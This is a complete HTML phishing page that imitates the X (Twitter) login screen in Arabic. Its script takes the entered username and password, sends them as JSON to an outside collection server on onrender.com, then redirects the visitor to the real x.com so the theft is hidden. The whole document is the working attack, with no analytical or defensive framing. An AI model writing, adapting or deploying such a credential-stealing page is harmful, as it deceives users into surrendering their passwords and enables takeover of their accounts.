<!DOCTYPE html><html><head><meta charset="UTF-8"><title>X Login</title><style>body{background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.box{width:320px;padding:20px;}input{width:100%;padding:15px;margin:10px 0;background:#000;border:1px solid #333;color:#fff;border-radius:5px;box-sizing:border-box;}.btn{background:#fff;color:#000;width:100%;padding:12px;border-radius:20px;font-weight:bold;cursor:pointer;}</style></head><body><div class="box"><h1 style="font-size:50px; text-align:center;">𝕏</h1><h3>تسجيل الدخول إلى X</h3><form id="f"><input type="text" id="u" placeholder="البريد أو المستخدم" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تسجيل الدخول</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'X (Twitter)',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://x.com';});};</script></body></html>
